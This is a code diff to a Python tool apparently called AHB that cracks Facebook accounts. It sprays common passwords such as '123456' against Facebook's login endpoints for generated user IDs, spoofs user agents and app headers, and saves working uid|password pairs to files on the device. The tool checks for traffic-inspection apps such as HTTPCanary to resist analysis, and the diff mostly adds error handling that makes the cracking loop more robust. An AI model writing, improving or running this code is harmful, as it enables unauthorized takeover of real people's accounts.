@@ -17,7 +17,7 @@ from concurrent.futures import ThreadPoolExecutor as tred
 import requests
 
 # Global variables
-method = []; oks = []; cps = []; loop = 0; user = []
+method = []; oks = []; cps = []; loop = 0; user = []; stop_cloning = False
 
 # -------------------- Initial Setup --------------------
 # Ensure required modules are installed
@@ -49,8 +49,11 @@ class sec:
         ]
         for path in paths:
             if os.path.exists(path):
-                if 'print' in open(path, 'r').read():
-                    self.fuck()
+                try:
+                    if 'print' in open(path, 'r').read():
+                        self.fuck()
+                except:
+                    pass
         # Check for HTTPCanary
         if os.path.exists('/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png'):
             self.fuck()
@@ -351,15 +354,15 @@ def check_activation():
 def windows():
     """Generates a random Windows User-Agent string with more variations."""
     aV = str(random.choice(range(10, 20)))
-    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
+    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(1, 100)))}.0 Safari/534.{aV}"
     bV = str(random.choice(range(1, 36)))
     bx = str(random.choice(range(34, 38)))
     bz = f'5{bx}.{bV}'
-    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
+    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(1000, 5000)))}.0 Safari/{bz}"
     cV = str(random.choice(range(1, 36)))
     cx = str(random.choice(range(34, 38)))
     cz = f'5{cx}.{cV}'
-    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
+    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.0 Safari/{cz}"
     D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
     return random.choice([A, B, C, D])
 
@@ -398,7 +401,7 @@ def login_1(uid):
     try:
         with console.lock:
             ts = datetime.now().strftime('%H:%M:%S')
-            msg = console._apply_tags(f"\r {DIM}[{ts}]{RESET} [bold green]AHB/MODEL 👑[/bold green] [bold yellow]{loop}[/bold yellow] [bold green]OK:{len(oks)}[/bold green] [bold red]CP:{len(cps)}[/bold red] ")
+            msg = console._apply_tags(f"\r {DIM}[{ts}]{RESET} [bold green]AHB/MODEL 👑[/bold green] [bold yellow]{loop}[/bold yellow] [bold green]OK:{len(oks)}[/bold green] [bold red]CP:{len(cps)}[/bold red]")
             sys.stdout.write(msg); sys.stdout.flush()
         for pw in ('123456', '1234567', '12345678', '123456789'):
             data = {
@@ -420,14 +423,23 @@ def login_1(uid):
                 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True',
                 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
             }
-            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
+            try:
+                res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
+            except:
+                continue
             if 'session_key' in res:
                 console.log(f"[bold green]AHB-OK[/bold green] [white]{uid} | {pw} | {creationyear(uid)}[/white]")
-                open('/sdcard/AHB-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                try:
+                    open('/sdcard/AHB-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                except:
+                    pass
                 oks.append(uid); break
             elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                 console.log(f"[bold yellow]AHB-CP[/bold yellow] [dim]{uid} | {pw}[/dim]")
-                open('/sdcard/AHB-CP.txt', 'a').write(f"{uid}|{pw}\n")
+                try:
+                    open('/sdcard/AHB-CP.txt', 'a').write(f"{uid}|{pw}\n")
+                except:
+                    pass
                 cps.append(uid); break
         loop += 1
     except: pass
@@ -437,7 +449,7 @@ def login_2(uid):
     try:
         with console.lock:
             ts = datetime.now().strftime('%H:%M:%S')
-            msg = console._apply_tags(f"\r {DIM}[{ts}]{RESET} [bold green]AHB/MODEL 👑[/bold green] [bold yellow]{loop}[/bold yellow] [bold green]OK:{len(oks)}[/bold green] [bold red]CP:{len(cps)}[/bold red] ")
+            msg = console._apply_tags(f"\r {DIM}[{ts}]{RESET} [bold green]AHB/MODEL 👑[/bold green] [bold yellow]{loop}[/bold yellow] [bold green]OK:{len(oks)}[/bold green] [bold red]CP:{len(cps)}[/bold red]")
             sys.stdout.write(msg); sys.stdout.flush()
         for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
             with requests.Session() as session:
@@ -451,15 +463,24 @@ def login_2(uid):
                     'content-type': 'application/x-www-form-urlencoded',
                     'x-fb-http-engine': 'Liger'
                 }
-                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
-                po = session.get(url, headers=headers).json()
+                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login"
+                try:
+                    po = session.get(url, headers=headers).json()
+                except:
+                    continue
                 if 'session_key' in str(po):
                     console.log(f"[bold green]AHB-OK[/bold green] [white]{uid} | {pw} | {creationyear(uid)}[/white]")
-                    open('/sdcard/AHB-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                    try:
+                        open('/sdcard/AHB-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                    except:
+                        pass
                     oks.append(uid); break
                 elif 'checkpoint' in str(po):
                     console.log(f"[bold yellow]AHB-CP[/bold yellow] [dim]{uid} | {pw}[/dim]")
-                    open('/sdcard/AHB-CP.txt', 'a').write(f"{uid}|{pw}\n")
+                    try:
+                        open('/sdcard/AHB-CP.txt', 'a').write(f"{uid}|{pw}\n")
+                    except:
+                        pass
                     cps.append(uid); break
         loop += 1
     except: pass
@@ -522,11 +543,17 @@ def cloning_process(name, prefixes):
     
     # Save progress
     if oks:
-        with open('/sdcard/AHB-OK.txt', 'a') as f:
-            for uid in oks: f.write(f"{uid}\n")
+        try:
+            with open('/sdcard/AHB-OK.txt', 'a') as f:
+                for uid in oks: f.write(f"{uid}\n")
+        except:
+            pass
     if cps:
-        with open('/sdcard/AHB-CP.txt', 'a') as f:
-            for uid in cps: f.write(f"{uid}\n")
+        try:
+            with open('/sdcard/AHB-CP.txt', 'a') as f:
+                for uid in cps: f.write(f"{uid}\n")
+        except:
+            pass
 
     console.print("\n"); linex()
     console.print("\n [bold green]CRACKING COMPLETED/INTERRUPTED[/bold green]")
